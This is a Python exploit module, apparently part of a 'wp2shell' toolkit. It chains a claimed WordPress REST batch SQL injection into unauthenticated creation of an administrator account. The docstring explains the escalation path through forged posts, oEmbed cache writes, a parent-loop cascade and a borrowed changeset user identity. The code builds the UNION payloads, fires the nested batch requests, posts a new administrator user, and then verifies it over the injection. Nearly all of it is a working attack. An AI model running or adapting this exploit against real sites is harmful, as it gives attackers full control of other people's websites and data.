"""CVE-2026-63030 + CVE-2026-60137 — clean-core unauthenticated admin creation.

This is the full escalation: from the nested-batch SQL injection (see ``sqli.py``)
to a **new administrator account**, on a stock install, with no plugin and no auth.
It never issues an SQL write; it steers WordPress's own privileged code paths.

The chain (each step verified live against 7.0.1 via a call-stack trace):

  1. The nested-batch ``UNION`` returns not one row but a small set of fabricated
     posts that ``WP_Query`` caches by ID for the rest of the request: a
     ``customize_changeset`` (status ``future``, a *past* ``post_date`` so it is due
     to publish, ``post_content`` holding a Customizer ``nav_menu_item[...]`` setting
     tagged ``"user_id": 1``), an ``oembed_cache`` post with **empty** content, and a
     couple of helpers wired into a **parent cycle**.
  2. The fabricated trigger post's ``[embed]`` renders during ``get_items``; because
     the forged ``oembed_cache`` row is empty, ``WP_Embed::shortcode()`` falls through
     its cache-hit guard, fetches the URL (a live oEmbed provider returns HTML), and
     calls ``wp_update_post()`` on that cache post — an anonymous request writing a post.
  3. ``wp_update_post`` runs ``wp_check_post_hierarchy_for_loops()``, which on the
     forged parent cycle calls ``wp_update_post()`` on the **loop members** — the
     changeset. Re-saving a past-dated ``future`` post flips it to ``publish``, firing
     ``transition_post_status`` -> ``_wp_customize_publish_changeset()``.
  4. ``_publish_changeset_values()`` does ``wp_set_current_user( $setting['user_id'] )``
     = user 1 before the setting's ``save()``. For that window the anonymous request
     is the administrator.
  5. A ``parse_request`` re-entry replays the batch tail — ``POST /wp/v2/users`` with
     ``roles:["administrator"]`` — while ``current_user`` is still 1, so
     ``WP_REST_Users_Controller::create_item`` passes its ``create_users`` check and
     ``wp_insert_user()`` writes a brand-new administrator.

Preconditions: the target must make a **successful outbound oEmbed fetch** (egress +
a provider that returns HTML), and the forged empty cache row must shadow the real one
in the per-request object cache. No plugin and no auth are required.

CREDIT: the escalation *sink* (the changeset identity-borrow in
``_publish_changeset_values``) was identified independently from the 7.0.1 source. The
*trigger geometry* that welds it into a working exploit — routing an unauthenticated
``wp_update_post`` through the oEmbed cache and a post-hierarchy-loop cascade onto the
changeset, and the shape of the forged post set — is taken from shinthink's public
full-chain PoC (https://github.com/shinthink/CVE-2026-63030). See docs/analysis.md §4.2
and CREDITS.md.
"""

import hashlib
import json
import secrets
import time
import urllib.parse

from . import sqli
from .http import send_batch
from .desync import MALFORMED

_HEX_DATE = "0x" + "2020-01-01 00:00:00".encode().hex()

# oEmbed cache key = md5( url . serialize($attr) ); $attr is the [embed] shortcode's
# width/height as strings. These must agree or find_oembed_post_id misses the row.
_EMBED_W, _EMBED_H = 500, 750
_EMBED_ATTR_SER = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'

# Default providers that reliably return oEmbed HTML. The FIRST is used for the live
# trigger, so it must be reachable from the *target* and return HTML; override with
# --embed-url (e.g. point at your own oEmbed endpoint) when the target's egress is
# restricted.
DEFAULT_EMBED_URLS = [
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    "https://vimeo.com/76979871",
    "https://twitter.com/jack/status/20",
]

_OEMBED_CACHE_HEX = "0x" + "oembed_cache".encode().hex()


def _hx(s):
    return "0x" + s.encode().hex() if s else "''"


def _row(rid, body="", title="", status="publish", slug="", parent=0, kind="post", author=1):
    """A 23-column ``wp_posts`` tuple used inside the UNION."""
    return ",".join([
        str(rid), str(author), _HEX_DATE, _HEX_DATE, _hx(body), _hx(title), "''",
        _hx(status), _hx("closed"), _hx("closed"), "''", _hx(slug), "''", "''",
        _HEX_DATE, _HEX_DATE, "''", str(parent), "''", "0", _hx(kind), "''", "0"])


def _render_union(url, rows, tail=None, timeout=120):
    """Fire the nested batch whose inner GET carries a ``UNION`` of ``rows`` (raw
    ``wp_posts`` tuples). ``tail`` sub-requests are appended to the INNER batch so a
    ``parse_request`` re-entry can replay them under the borrowed identity. Returns raw."""
    payload = "1) AND 1=0 UNION ALL SELECT " + " UNION ALL SELECT ".join(rows) + " -- -"
    q = urllib.parse.quote(payload, safe="")
    inner = {"requests": [
        MALFORMED,
        {"method": "GET",
         "path": f"/wp/v2/posts/999999?author_exclude={q}&per_page=500&orderby=none"},
        {"method": "GET", "path": "/wp/v2/posts"}]}
    if tail:
        inner["requests"].extend(tail)
    outer = [MALFORMED,
             {"method": "POST", "path": "/wp/v2/posts", "body": inner},
             {"method": "POST", "path": "/batch/v1", "body": {"requests": []}}]
    return send_batch(url, outer, timeout=timeout)[1]


def _embed_shortcodes(urls):
    return "".join(f'[embed width="{_EMBED_W}" height="{_EMBED_H}"]{u}[/embed]' for u in urls)


def create_admin(url, username=None, password=None, embed_urls=None, prefix="wp_",
                 timeout=120, settle=2.0):
    """Run the full clean-core chain to create an administrator, unauthenticated.

    Returns a result dict with ``ok`` and (on success) the new ``username`` /
    ``password`` / ``user_id``, or ``ok=False`` with a ``reason``.
    """
    embed_urls = (embed_urls or DEFAULT_EMBED_URLS)[:3]
    if len(embed_urls) < 3:
        return {"ok": False, "reason": "need 3 distinct oEmbed provider URLs"}
    username = username or f"wp2_{secrets.token_hex(3)}"
    password = password or ("Wp2!" + secrets.token_urlsafe(12))
    email = f"{username}@wp2shell.invalid"

    # 1) Seed real oembed_cache rows by rendering a fabricated post that embeds the URLs.
    _render_union(url, [_row(0, body=_embed_shortcodes(embed_urls), title="seed", slug="seed")],
                  timeout=timeout)
    time.sleep(settle)

    # 2) Read the 3 cache post IDs back over the SQLi.
    ids = []
    for u in embed_urls:
        key = hashlib.md5((u + _EMBED_ATTR_SER).encode()).hexdigest()
        v = sqli.union_extract(
            url, f"SELECT ID FROM {prefix}posts WHERE post_type={_OEMBED_CACHE_HEX} "
                 f"AND post_name=0x{key.encode().hex()} ORDER BY ID DESC LIMIT 1")
        ids.append(int(v) if v and v.isdigit() else 0)
    if 0 in ids or len(set(ids)) != 3:
        return {"ok": False, "cache_ids": ids,
                "reason": "could not seed/read 3 oembed_cache rows — the target likely "
                          "lacks outbound egress or a reachable oEmbed provider"}

    # 3) Forge the changeset + accomplices. The cache-role row (cid) MUST be the first
    #    embed URL's row, because the live trigger renders embed_urls[0] and needs its
    #    fetch to return HTML (so the wp_update_post UPDATE branch runs, not an insert).
    cid, csid, rid = ids
    oid = 1800000000 + secrets.randbelow(9999999)
    nid, iid = oid + 1, oid + 2
    changeset = json.dumps(
        {f"nav_menu_item[{nid}]": {
            "type": "nav_menu_item", "user_id": 1,
            "value": {"object_id": 0, "object": "", "menu_item_parent": 0, "position": 0,
                      "type": "custom", "title": "wp2shell", "url": "https://wp2shell.invalid",
                      "status": "publish", "nav_menu_term_id": 0, "_invalid": False}}},
        separators=(",", ":"))
    rows = [
        _row(0, body=f'[embed width="{_EMBED_W}" height="{_EMBED_H}"]{embed_urls[0]}[/embed]',
             title="trigger", slug="trigger"),
        _row(csid, body=changeset, title="changeset", status="future",
             slug=secrets.token_hex(16), parent=oid, kind="customize_changeset"),
        _row(oid, body="outer", title="outer", status="draft", slug="outer", parent=csid),
        _row(cid, title="cache", slug="cache", parent=csid),
        _row(nid, body="nav", title="nav", slug="nav", parent=rid, kind="nav_menu_item"),
        _row(rid, body="parse", title="parse", status="parse", slug="parse", parent=iid, kind="request"),
        _row(iid, body="inner", title="inner", status="draft", slug="inner", parent=rid),
    ]
    ubody = {"username": username, "password": password, "email": email,
             "roles": ["administrator"]}
    tail = [{"method": "POST", "path": "/wp/v2/users", "body": ubody},
            {"method": "POST", "path": "/wp/v2/users", "body": ubody}]
    _render_union(url, rows, tail=tail, timeout=timeout)

    # 4) Confirm the account exists (unauthenticated, over the same SQLi).
    ulit = "0x" + username.encode().hex()
    count = sqli.union_extract(url, f"SELECT COUNT(*) FROM {prefix}users WHERE user_login={ulit}")
    if count != "1":
        return {"ok": False, "cache_ids": ids, "username": username,
                "reason": "chain fired but the admin was not created — the identity "
                          "borrow may not have triggered (retry; the trigger is timing/"
                          "cache-shadow sensitive)"}
    uid = sqli.union_extract(url, f"SELECT ID FROM {prefix}users WHERE user_login={ulit} LIMIT 1")
    cap_key = (prefix + "capabilities").encode().hex()
    is_admin = sqli.union_extract(
        url, f"SELECT (meta_value LIKE 0x{'%administrator%'.encode().hex()}) "
             f"FROM {prefix}usermeta WHERE user_id={uid or 0} "
             f"AND meta_key=0x{cap_key} LIMIT 1")
    return {"ok": True, "username": username, "password": password, "email": email,
            "user_id": uid, "roles": ["administrator"], "is_admin": is_admin == "1",
            "cache_ids": ids}
